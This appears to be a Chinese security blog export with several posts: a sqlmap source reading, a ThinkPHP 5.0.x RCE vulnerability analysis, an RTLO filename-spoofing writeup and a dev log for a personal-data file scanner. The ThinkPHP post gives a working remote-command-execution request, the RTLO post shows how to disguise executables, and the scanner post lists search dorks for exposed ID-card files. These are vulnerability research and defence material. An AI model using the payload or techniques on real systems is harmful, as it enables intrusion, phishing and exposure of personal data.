<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">walk</span>(<span class="params">head, current=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> current <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        current = head</span><br><span class="line">    <span class="keyword">if</span> isListLike(current):</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> current:</span><br><span class="line">            walk(head, _)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(current, <span class="built_in">dict</span>):</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> current.keys():</span><br><span class="line">            value = current[key]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, (<span class="built_in">list</span>, <span class="built_in">tuple</span>, <span class="built_in">set</span>, <span class="built_in">dict</span>)):</span><br><span class="line">                <span class="keyword">if</span> value:</span><br><span class="line">                    walk(head, value)</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(value, (<span class="built_in">bool</span>, <span class="built_in">int</span>, <span class="built_in">float</span>, basestring)):</span><br><span class="line">                original = current[key]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, <span class="built_in">bool</span>):</span><br><span class="line">                    current[key] = <span class="string">&quot;%s%s&quot;</span> % (getUnicode(value).lower(), BOUNDED_INJECTION_MARKER)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    current[key] = <span class="string">&quot;%s%s&quot;</span> % (value, BOUNDED_INJECTION_MARKER)</span><br><span class="line">                candidates[<span class="string">&quot;%s (%s)&quot;</span> % (parameter, key)] = re.sub(<span class="string">r&quot;\b(%s\s*=\s*)%s&quot;</span> % (re.escape(parameter), re.escape(testableParameters[parameter])), <span class="string">r&quot;\g&lt;1&gt;%s&quot;</span> % json.dumps(deserialized, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>) <span class="keyword">if</span> <span class="string">&quot;, &quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> testableParameters[parameter] <span class="keyword">else</span> <span class="literal">None</span>), parameters)</span><br><span class="line">                current[key] = original</span><br></pre></td></tr></table></figure>

<p>该<code>walk()</code>函数,通过递归的方式,检查json里面的每个值是否是符合某个数据类型.</p>
<p>如果该参数值能够反序列化,<code>sqlmap</code>会提示说</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xx parameter is JSON deserializable. Do you want to inject inside?</span><br></pre></td></tr></table></figure>

<p>例子:</p>
<p><img src="https://i.loli.net/2019/04/26/5cc2e35c6d51b.jpg"></p>
<p>比如通过表单的方式来传json类型的数据.</p>
<p>整个包不符合json类型,但是里面的参数值是可以被Json反序列化的.</p>
<h4 id="尝试xml解析"><a href="#尝试xml解析" class="headerlink" title="尝试xml解析:"></a>尝试xml解析:</h4><p>比如这类的数据包(为了方便看,xml参数已urldecode):</p>
<p><img src="https://i.loli.net/2019/04/26/5cc2e35d21b7a.jpg"></p>
<p>比如通过表单的方式来传xml类型的数据.</p>
<p>整个包不符合xml类型,但是里面的某个参数值是xml类型的数据.</p>
<p>解析到该类型数据,<code>sqlmap</code>会提示说</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">it appears that provided value for POST parameter &#x27;xml&#x27; has boundaries. Do you want to inject inside? </span><br></pre></td></tr></table></figure>

<hr>
<h2 id="结束解析"><a href="#结束解析" class="headerlink" title="结束解析:"></a>结束解析:</h2><h3 id="判断指定的参数有没在可测试的参数字典里面"><a href="#判断指定的参数有没在可测试的参数字典里面" class="headerlink" title="判断指定的参数有没在可测试的参数字典里面."></a>判断指定的参数有没在可测试的参数字典里面.</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 函数开始</span></span><br><span class="line">testableParameters = OrderedDict() </span><br></pre></td></tr></table></figure>

<p>函数开始的一开始,就定义了一个有序字典,用来存放<strong>可测试的参数</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> conf.testParameter: <span class="comment"># 通过-p指定可测试参数,如果给了</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> testableParameters: <span class="comment"># 如果没有可测试参数</span></span><br><span class="line">        paramStr = <span class="string">&quot;, &quot;</span>.join(test <span class="keyword">for</span> test <span class="keyword">in</span> conf.testParameter)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(conf.testParameter) &gt; <span class="number">1</span>:</span><br><span class="line">            warnMsg = <span class="string">&quot;provided parameters &#x27;%s&#x27; &quot;</span> % paramStr</span><br><span class="line">            warnMsg += <span class="string">&quot;are not inside the %s&quot;</span> % place</span><br><span class="line">            logger.warn(warnMsg)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            parameter = conf.testParameter[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> intersect(USER_AGENT_ALIASES + REFERER_ALIASES + HOST_ALIASES, parameter, <span class="literal">True</span>):</span><br><span class="line">                debugMsg = <span class="string">&quot;provided parameter &#x27;%s&#x27; &quot;</span> % paramStr</span><br><span class="line">                debugMsg += <span class="string">&quot;is not inside the %s&quot;</span> % place</span><br><span class="line">                logger.debug(debugMsg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(conf.testParameter) != <span class="built_in">len</span>(testableParameters):</span><br><span class="line">        <span class="keyword">for</span> parameter <span class="keyword">in</span> conf.testParameter:</span><br><span class="line">            <span class="keyword">if</span> parameter <span class="keyword">not</span> <span class="keyword">in</span> testableParameters:</span><br><span class="line">                debugMsg = <span class="string">&quot;provided parameter &#x27;%s&#x27; &quot;</span> % parameter</span><br><span class="line">                debugMsg += <span class="string">&quot;is not inside the %s&quot;</span> % place</span><br><span class="line">                logger.debug(debugMsg)</span><br></pre></td></tr></table></figure>

<p>经过检验和解析后,testableParameters里存放着<code>sqlmap</code>认为可以测试的点.</p>
<p>例子:</p>
<p>一个普通的post包:<br><img src="https://i.loli.net/2019/04/26/5cc2e35dbda98.jpg"></p>
<p>通过post传过去的参数只有<code>sceneId</code></p>
<p>但是<code>sqlmap</code>认为可测试的点有很多</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-------testableParameters--------</span><br><span class="line">OrderedDict([(u&#x27;JSESSIONID&#x27;, u&#x27;6006F1BD1A9B669150FBF263483BE49B&#x27;), (u&#x27;gr_user_id&#x27;, u&#x27;6f346caa-beb4-49c1-bab6-4c684bb5680a&#x27;), (u&#x27;ajs_user_id&#x27;, u&#x27;null&#x27;), (u&#x27;ajs_group_id&#x27;, u&#x27;null&#x27;), (u&#x27;ajs_anonymous_id&#x27;, u&#x27;%2265b5e8a7-ef15-4279-8897-0cf64a34baaa%22&#x27;), (u&#x27;zg_did&#x27;, u&#x27;%7B%22did%22%3A%20%221693241ce78150-0e47fe537c96ac-4c322f7c-144000-1693241ce796db%22%7D&#x27;), (u&#x27;zg_153e3dce26ad42f2af4ae846edfdc259&#x27;, u&#x27;%7B%22sid%22%3A%201551335266969%2C%22updated%22%3A%201551335266979%2C%22info%22%3A%201551326367365%2C%22superProperty%22%3A%20%22%7B%7D%22%2C%22platform%22%3A%20%22%7B%7D%22%2C%22utm%22%3A%20%22%7B%7D%22%2C%22referrerDomain%22%3A%20%22%22%2C%22landHref%22%3A%20%22http%3A%2F%2Fwotubbs.vanke.com%2Fwotuhome_node%2F%23%2F%22%7D&#x27;), (u&#x27;UM_distinctid&#x27;, u&#x27;16955f9cc826fe-022ac9d6e823218-4c322f7c-144000-16955f9cc83645&#x27;)])</span><br><span class="line">-------testableParameters--------</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可能就这是自动化工具与手工测试的差别</p>
</blockquote>
<hr>
<h3 id="尝试对参数值解密"><a href="#尝试对参数值解密" class="headerlink" title="尝试对参数值解密:"></a>尝试对参数值解密:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> testableParameters: <span class="comment"># 有可测试的参数</span></span><br><span class="line">    <span class="keyword">for</span> parameter, value <span class="keyword">in</span> testableParameters.items():</span><br><span class="line">        <span class="keyword">if</span> value <span class="keyword">and</span> <span class="keyword">not</span> value.isdigit():</span><br><span class="line">            <span class="keyword">for</span> encoding <span class="keyword">in</span> (<span class="string">&quot;hex&quot;</span>, <span class="string">&quot;base64&quot;</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    decoded = value.decode(encoding) <span class="comment"># 尝试解码</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(decoded) &gt; MIN_ENCODED_LEN_CHECK <span class="keyword">and</span> <span class="built_in">all</span>(_ <span class="keyword">in</span> string.printable <span class="keyword">for</span> _ <span class="keyword">in</span> decoded): <span class="comment">#</span></span><br><span class="line">                        <span class="comment"># MIN_ENCODED_LEN_CHECK:5</span></span><br><span class="line">                        warnMsg = <span class="string">&quot;provided parameter &#x27;%s&#x27; &quot;</span> % parameter</span><br><span class="line">                        warnMsg += <span class="string">&quot;appears to be &#x27;%s&#x27; encoded&quot;</span> % encoding</span><br><span class="line">                        logger.warn(warnMsg)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>解密方式:</p>
<ul>
<li><code>hex</code></li>
<li><code>base64</code></li>
</ul>
<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><ul>
<li><p>参数里可能会包含html编码字符,例如<code>__AMP__</code>, <code>__SEMICOLON__</code>. 如果有的话,将参数提取出来.</p>
</li>
<li><p>参数分隔:</p>
<ul>
<li>Cookie里的参数,一般用<code>;</code>作为分隔符</li>
<li>Get、Post里的参数,一般用<code>&amp;</code>作为分隔符</li>
</ul>
</li>
<li><p>参数如果含HTML标签,去掉HTML标签</p>
</li>
<li><p>参数名和值分隔,一般用<code>=</code>分隔</p>
</li>
<li><p><code>urldecode</code>参数名</p>
</li>
<li><p>检验参数值,<strong>参数值被污染</strong>的情况:</p>
<ul>
<li>含有单引号<code>&#39;</code></li>
<li>开头有3个9或者更多 (不知道为什么)</li>
<li>含<code>-数字</code> (类似id&#x3D;2-1 这种payload吧)</li>
<li>含以下关键词<code>AND</code>、<code>OR</code>、<code>UNION</code>、<code>SELECT</code>、<code>FROM</code>、<code>CONCAT</code>、<code>information_schema</code>、<code>SLEEP</code>、<code>DELAY</code>、<code>FLOOR</code>、<code>(RAND)</code> (常见payload关键字)</li>
<li>含google分析cookie前缀<code>__UTM</code></li>
</ul>
</li>
<li><p>解析特殊情况的参数值:</p>
<ul>
<li>通过表单方式提交的<code>xml</code>数据</li>
<li>通过表单方式提交的<code>json</code>数据</li>
</ul>
</li>
<li><p>尝试对参数值解密:<code>base64</code>, <code>hex</code></p>
</li>
<li><p>自动化工具发现的<strong>可测试的参数</strong>一般比手工测试发现得多.</p>
</li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</title>
    <url>//14782.html</url>
    <content><![CDATA[<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>未开启debug模式,</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url: </span><br><span class="line"></span><br><span class="line">http://tp1-11:8888/public/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/04/25/5cc1d7015713b.jpg"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析:"></a>漏洞分析:</h1><p>定位关键代码:</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d702b349b.jpg"></p>
<p>第525行: 读取了配置文件的<code>var_method</code>,</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d7034882d.jpg"></p>
<p>并赋值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;method = _method</span><br></pre></td></tr></table></figure>
<p>第526行: </p>
<p>引用了外部变量$POST</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d703bcc3f.jpg"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;method&#125;(<span class="variable">$_POST</span>);  </span><br></pre></td></tr></table></figure>

<p>执行结果:</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d70444143.jpg"></p>
<p>将Request类的method覆盖了,这个时候将调用Request类构造函数<code>__construct</code></p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d7055332e.jpg"></p>
<p>构造函数引入了外部变量,准备创建一个新实例</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d705c5a02.jpg"></p>
<p>这个实例的属性</p>
<ul>
<li><code>$method</code>被设置成了<code>get</code></li>
<li><code>$get</code>方法的请求参数被设置成了一个array,值为<code>whoami</code></li>
<li>全局过滤规则<code>$filter</code>被设置成了一个array,值为<code>system</code></li>
</ul>
<p><img src="https://i.loli.net/2019/04/25/5cc1d7068e01a.jpg"></p>
<p>这个时候实例的初始化完成了。</p>
<p>跳回到了<code>Route.php</code>检测URL路由的函数<code>check()</code>,这个时候的<code>method</code>值为<code>get</code></p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d707cf7fd.jpg"></p>
<p>经过一连串检测之后,</p>
<p><code>App.php</code>run()函数对请求执行调用分发</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d70872afc.jpg"></p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fz7qen6irnj311v0da46r.jpg"></p>
<p>继续跟进，</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fz7qhscv91j312u0lugyx.jpg"></p>
<p>调用栈:</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fz7qk80k5kj309c05a0uh.jpg"></p>
<ul>
<li><code>param()</code>获取当前请求的参数</li>
<li><code>method()</code>当前的请求类型</li>
<li><code>server()</code>获取server参数</li>
<li><code>input()</code>获取变量 支持过滤和默认值</li>
<li><code>getFilter()</code>获取过滤方法</li>
</ul>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fz7qnb07thj30jj06uju4.jpg"></p>
<p>这个时候我们之前创建的请求实例的<code>filter</code>方法为<code>system</code></p>
<p>继续</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fz7qur7jtvj309e01vgma.jpg"></p>
<ul>
<li><code>param()</code>获取当前请求的参数</li>
</ul>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fz7qvuht18j30s00con3k.jpg"></p>
<ul>
<li><code>get()</code>设置获取GET参数</li>
</ul>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fz7qwkd5yrj30ot08l428.jpg"></p>
<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fz7r0j1jbdj309d01vaar.jpg"></p>
<ul>
<li><code>input()</code>获取变量 支持过滤和默认值</li>
</ul>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fz7r1w473pj30in0m4gsh.jpg"></p>
<ul>
<li><code>array_walk_recursive()</code></li>
<li><code>filterValue</code>递归过滤给定的值<br><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fz7r3rql44j30o70ewwl1.jpg"></li>
</ul>
<p>执行结果:</p>
<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fz7r53bec4j31080f40zt.jpg"></p>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://xz.aliyun.com/t/3845">ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a></li>
<li><a href="https://blog.csdn.net/u012903789/article/details/82433160">php:&#x2F;&#x2F;input</a></li>
</ul>
]]></content>
      <categories>
        <category>VulnAnalysis</category>
      </categories>
      <tags>
        <tag>VulnAnalysis</tag>
      </tags>
  </entry>
  <entry>
    <title>Unicode RTLO(Right-To-Left Override)字符欺骗</title>
    <url>//28275.html</url>
    <content><![CDATA[<h1 id="什么是RTLO"><a href="#什么是RTLO" class="headerlink" title="什么是RTLO:"></a>什么是RTLO:</h1><p>RTLO是一个8238的Unicode字符，它的作用是让紧跟在后面的字符串倒序： <a href="http://www.codetable.net/decimal/8238">http://www.codetable.net/decimal/8238</a></p>
<p>可以用来欺骗用户打开可执行文件（钓鱼攻击），或者欺骗后端应用的检查机制</p>
<hr>
<h1 id="创建欺骗文件"><a href="#创建欺骗文件" class="headerlink" title="创建欺骗文件:"></a>创建欺骗文件:</h1><p>1.使用名称<code>TestingRTLO[U+202E]xcod.txt</code>创建一个文件</p>
<p>2.windows自带的character map软件中,找到对应的字符.</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201110103632.png" alt="20201110103632"></p>
<p>3.复制替换<code>[U + 202E]</code>字符,保存.</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201110103755.png" alt="20201110103755"></p>
<p>在软件中发送过去</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201110103830.png" alt="20201110103830"></p>
<p>下载来是</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201110103914.png" alt="20201110103914"></p>
<p>同理可制作一个exe结尾的。</p>
<p>发过去是log结尾</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201110104003.png" alt="20201110104003"></p>
<p>下载到本地,实际上是exe结尾的。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201110104018.png" alt="20201110104018"></p>
<hr>
<h1 id="危害"><a href="#危害" class="headerlink" title="危害:"></a>危害:</h1><p>可制作以下后缀名的文件:</p>
<ul>
<li>.bat</li>
<li>.exe</li>
<li>.cmd</li>
<li>.com</li>
<li>.lnk</li>
<li>.pif</li>
<li>.scr</li>
<li>.vb</li>
<li>.vbe</li>
<li>.vbs</li>
<li>.wsh</li>
</ul>
<hr>
<h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案:"></a>修复方案:</h1><p>参考:<a href="https://github.com/nextcloud/server/pull/10030">https://github.com/nextcloud/server/pull/10030</a></p>
<p>把该Unicode字符过滤掉</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201110104540.png" alt="20201110104540"></p>
<hr>
<h1 id="漏洞案例"><a href="#漏洞案例" class="headerlink" title="漏洞案例:"></a>漏洞案例:</h1><p><a href="https://hackerone.com/reports/229170">RTLO character allowed in shared files</a><br><a href="https://hackerone.com/reports/196222">RTLO char allowed in chat</a></p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><p><a href="https://resources.infosecinstitute.com/topic/spoof-using-right-to-left-override-rtlo-technique-2/#:~:text=What%20is%20RTLO%3F,right%2Dto%2Dleft%20order.">Spoof Using Right to Left Override (RTLO) Technique</a><br><a href="http://www.lijiejie.com/unicode-rtlo-right-to-left-override-issue/">Unicode RTLO(Right-To-Left Override) Security ISSUE</a></p>
]]></content>
      <categories>
        <category>WebSecurity</category>
      </categories>
      <tags>
        <tag>WebSecurity</tag>
      </tags>
  </entry>
  <entry>
    <title>WPSIH-网站个人敏感信息文件扫描器-开发记录</title>
    <url>//64851.html</url>
    <content><![CDATA[<h1 id="项目名-WPSIH"><a href="#项目名-WPSIH" class="headerlink" title="项目名:WPSIH"></a>项目名:WPSIH</h1><p>Website Sensitive Personal Information Hunter-网站个人敏感信息文件扫描器</p>
<p><img src="https://i.loli.net/2019/04/28/5cc5b3a24036a.png"></p>
<p>项目地址:<a href="https://github.com/jerrychan807/WSPIH">WSPIH</a></p>
<hr>
<h1 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果:"></a>运行效果:</h1><p><img src="https://i.loli.net/2019/04/30/5cc72451486a1.png"></p>
<hr>
<h1 id="程序执行逻辑"><a href="#程序执行逻辑" class="headerlink" title="程序执行逻辑:"></a>程序执行逻辑:</h1><p><img src="https://i.loli.net/2019/04/29/5cc71ada6c08d.png"></p>
<hr>
<h2 id="爬取链接"><a href="#爬取链接" class="headerlink" title="爬取链接:"></a>爬取链接:</h2><p>需要过滤掉一些无用的后缀名:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IGNORED_EXTESIONS = [&quot;gif&quot;, &quot;jpg&quot;, &quot;png&quot;, &quot;jpeg&quot;, &quot;woff&quot;, &quot;ttf&quot;, &quot;eot&quot;, &quot;svg&quot;, &quot;woff2&quot;, &quot;ico&quot;]</span><br></pre></td></tr></table></figure>

<p>并筛选出需要的后缀名,然后保存下来:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXCEL_EXTENSIONS = [&quot;xls&quot;, &quot;xlsx&quot;]</span><br><span class="line">PDF_EXTENSIONS = [&quot;pdf&quot;]</span><br><span class="line">WORD_EXTENSIONS = [&quot;doc&quot;, &quot;docx&quot;]</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="解析文本内容"><a href="#解析文本内容" class="headerlink" title="解析文本内容:"></a>解析文本内容:</h2><p>ExcelParser:</p>
<ul>
<li>使用<code>xlrd</code>模块</li>
</ul>
<p>PdfParser：</p>
<ul>
<li>使用<code>pdfminer</code>模块</li>
<li>无法检测图片中是否存在敏感信息；</li>
</ul>
<p>WordParser:</p>
<ul>
<li>使用<code>python-docx</code>模块</li>
<li>无法检测图片中是否存在敏感信息；</li>
<li>只支持.docx</li>
</ul>
<blockquote>
<p><code>doc</code>后缀的,需要在wins环境下转换成<code>docx</code>后缀,然后才能解析.遂放弃.</p>
</blockquote>
<hr>
<h2 id="基于正则匹配敏感信息"><a href="#基于正则匹配敏感信息" class="headerlink" title="基于正则匹配敏感信息"></a>基于正则匹配敏感信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHONE_REGEX = r&#x27;^(?:\+?86)?1(?:3\d&#123;3&#125;|5[^4\D]\d&#123;2&#125;|8\d&#123;3&#125;|7(?:[35678]\d&#123;2&#125;|4(?:0\d|1[0-2]|9\d))|9[189]\d&#123;2&#125;|66\d&#123;2&#125;)\d&#123;6&#125;$&#x27;</span><br><span class="line"></span><br><span class="line">EMAIL_REGEX = r&#x27;^\w+@(\w+\.)+\w+&#x27;</span><br><span class="line"></span><br><span class="line">IDCARD_REGEX = r&#x27;^[1-9]\d&#123;5&#125;(18|19|20)\d&#123;2&#125;((0[1-9])|(1[0-2]))(([0-2][1-9])|10|20|30|31)\d&#123;3&#125;[0-9Xx]&#x27;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>手机号码的正则一开始没在后面加上<code>$</code>符号(<code>$</code>是正则表达式匹配字符串结束位置),因为一开始在简单测试excel里的手机号码的时候,发现有这种情况:<code>13424324567.0</code>,所以唐突的把<code>$</code>去掉了.</p>
<p>这种就是没有经过大量测试的后果.</p>
<p>导致产生了很多误报. 可见正则大法好,但是要<strong>深刻理解和正确使用</strong>.不然误报太多了.</p>
</blockquote>
<hr>
<h1 id="一些有趣的点"><a href="#一些有趣的点" class="headerlink" title="一些有趣的点:"></a>一些有趣的点:</h1><h2 id="隐藏起来的敏感信息"><a href="#隐藏起来的敏感信息" class="headerlink" title="隐藏起来的敏感信息:"></a>隐藏起来的敏感信息:</h2><p>有些文件是能匹配出敏感结果的,但是实际上你去打开那个文件,你会找不到结果.举例如下:</p>
<ul>
<li>excel的隐藏列:</li>
</ul>
<p><img src="https://i.loli.net/2019/04/29/5cc71c1146490.png"></p>
<ul>
<li>excel的折叠列:</li>
</ul>
<p>拉开前:</p>
<p><img src="https://i.loli.net/2019/04/30/5cc736e3b72a8.png"></p>
<p>看图上的绿色线,是把内容折叠了起来</p>
<p>实际上把绿色线拉开之后,确实是存在敏感信息的.</p>
<p><img src="https://i.loli.net/2019/04/30/5cc736f97350d.png"></p>
<hr>
<h2 id="在书里找到了敏感信息"><a href="#在书里找到了敏感信息" class="headerlink" title="在书里找到了敏感信息:"></a>在书里找到了敏感信息:</h2><p>在一本书里,匹配到了邮箱…估计是作者、出版社的联系方式..</p>
<p><img src="https://i.loli.net/2019/04/30/5cc721bf2ce18.jpg"></p>
<p>尴尬…</p>
<hr>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题:"></a>问题:</h1><h2 id="已解决的Bug"><a href="#已解决的Bug" class="headerlink" title="已解决的Bug:"></a>已解决的Bug:</h2><h3 id="把命令写死了"><a href="#把命令写死了" class="headerlink" title="把命令写死了:"></a>把命令写死了:</h3><p><img src="https://i.loli.net/2019/04/30/5cc7233328377.png"></p>
<blockquote>
<p>不同环境下的python执行路径是不同的…</p>
</blockquote>
<hr>
<h3 id="跨平台运行的问题"><a href="#跨平台运行的问题" class="headerlink" title="跨平台运行的问题:"></a>跨平台运行的问题:</h3><p>比如wins下没有<code>find</code>命令,要用<code>for</code></p>
<blockquote>
<p>跨平台运行是个令人头疼的问题呀..会有很多意想不到的结果出现.</p>
</blockquote>
<hr>
<h3 id="减少模板类文件的误报"><a href="#减少模板类文件的误报" class="headerlink" title="减少模板类文件的误报:"></a>减少模板类文件的误报:</h3><p>如模板类,解决办法: 通过数量判定,例如从某个文件收集到的邮箱少于2个.则认为这是个模板类文件.</p>
<p>举例:</p>
<p><img src="https://i.loli.net/2019/04/28/5cc5c4a676f30.png"><br><img src="https://i.loli.net/2019/04/28/5cc5c5113bb70.png"></p>
<hr>
<h1 id="待改进的地方"><a href="#待改进的地方" class="headerlink" title="待改进的地方:"></a>待改进的地方:</h1><hr>
<h2 id="更多的正则匹配"><a href="#更多的正则匹配" class="headerlink" title="更多的正则匹配:"></a>更多的正则匹配:</h2><p>for Chinese:</p>
<ul>
<li>支付宝账号</li>
<li>社保账号</li>
<li>银行卡号</li>
<li>身份证</li>
<li>护照</li>
<li>香港永久性居民身份证</li>
<li>澳门永久性居民身份证</li>
<li>台湾居民来往大陆通行证</li>
<li>军官证</li>
</ul>
<p>for Foreign:</p>
<ul>
<li>外国手机号</li>
<li>外国身份证号码</li>
</ul>
<blockquote>
<p>估计也没时间去完善hhh</p>
</blockquote>
<hr>
<h2 id="基于关键字匹配"><a href="#基于关键字匹配" class="headerlink" title="基于关键字匹配:"></a>基于关键字匹配:</h2><ul>
<li>身份证</li>
<li>身份证号</li>
<li>身份证号码</li>
<li>身份证件号码</li>
<li>证件号码 </li>
<li>zjhm</li>
<li>证件类型</li>
<li>证书号码</li>
<li>手机</li>
<li>联系电话</li>
<li>联系方式</li>
<li>电子邮箱</li>
<li>dzly</li>
<li>通信地址</li>
<li>家庭地址</li>
</ul>
<blockquote>
<p>预期使用关键词匹配的话,误报会很多,只适用于excel类型的表头.</p>
</blockquote>
<hr>
<h2 id="动态链接下载"><a href="#动态链接下载" class="headerlink" title="动态链接下载:"></a>动态链接下载:</h2><ul>
<li><code>http://yjsy.uibe.edu.cn/common/downloadFile.jsp?id=119295</code></li>
<li><code>http://yz.nwafu.edu.cn/common/rtfeditor/openfile.jsp?id=DBCPDBDDDFDIDBCPDADBDGCOHIGMHD</code></li>
</ul>
<p>类似以上这种url,要访问动态链接,服务器才会返回文件的url地址.</p>
<p>目前是处理不了这种情况.</p>
<blockquote>
<p>搜索引擎是可以爬取到这类url的文件的<br>预计解决办法是:1.要用上无头浏览器等技术.模拟发包是不行的 2.直接访问该url并下载文件.</p>
</blockquote>
<hr>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他:"></a>其他:</h1><hr>
<h2 id="测试服务器"><a href="#测试服务器" class="headerlink" title="测试服务器:"></a>测试服务器:</h2><p><img src="https://i.loli.net/2019/04/30/5cc732ed512d9.jpg"></p>
<p>跑到机子模糊…</p>
<p><img src="https://i.loli.net/2019/04/30/5cc7330875dcd.jpg"></p>
<hr>
<h2 id="搜索引擎hack"><a href="#搜索引擎hack" class="headerlink" title="搜索引擎hack:"></a>搜索引擎hack:</h2><p>百度:</p>
<p><code>site:*.edu.cn filetype:xls</code><br><code>site:*.edu.cn filetype:xls 身份证</code></p>
<p>google:</p>
<p><code>site:*.edu.cn filetype:xls</code></p>
<blockquote>
<p>主要是用于前期寻找测试文件</p>
</blockquote>
<hr>
<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点:"></a>注意点:</h2><p>我已知的,目前<code>edu-src</code>判定是敏感文件的范围是:</p>
<ul>
<li>个人手机</li>
<li>个人住址</li>
<li><del>个人邮箱</del> (目前不收了)</li>
<li><strong>身份证</strong></li>
</ul>
<p>不属于的范围:</p>
<ul>
<li>工作邮箱</li>
<li>准考证号</li>
</ul>
<blockquote>
<p>知道规则也很重要..hhh</p>
</blockquote>
<hr>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案:"></a>修复方案:</h2><ul>
<li>作为信息公示的话,身份证显示后六位或者打码显示即可</li>
<li>如无必要,不要上传到公网上.</li>
</ul>
<hr>
<h1 id="Contributors"><a href="#Contributors" class="headerlink" title="Contributors:"></a>Contributors:</h1><ul>
<li>JackChan1024</li>
</ul>
<blockquote>
<p>hacking together , is so cool…</p>
</blockquote>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://jingyan.baidu.com/article/148a192191dc9a4d71c3b11c.html">excel中如何隐藏列和取消隐藏列</a></li>
